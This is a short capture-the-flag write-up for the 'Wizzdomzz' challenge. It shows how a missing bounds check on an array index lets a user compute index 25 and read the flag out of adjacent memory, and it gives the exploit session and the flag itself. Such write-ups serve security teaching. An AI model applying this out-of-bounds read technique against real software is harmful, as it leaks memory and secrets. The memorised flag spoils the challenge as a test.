# Wizzdomzz writeup
Binary file reads **flag.txt** and writes its contents to the global variable

The significant aspect is the way of address calculation:

```c
address = &wisdom_array + index * 120
```

And, as we may notice, there are no bounds check here - we can read data out of the array. Therefore, we can read flag. Let's calculate the correct index (flag address - `0x404C00`, wisdom array address - `0x4040C0`)

```c
cool_index = (&flag - &wisdom_array) / 120 + 1
```

`cool_index = 25`:

```bash
Wizzdomzz service: free wisdoms for everyone!
Commands:
  w: Read wisdom
  q: Quit
> w
Enter wisdom id (1-20):
25
Here is your wisdom: li2CTF{d0n7_f0rg37_4b0u7_1nd3x35_ch3ck5_1n_C/C++}
```

Flag: `li2CTF{d0n7_f0rg37_4b0u7_1nd3x35_ch3ck5_1n_C/C++}`
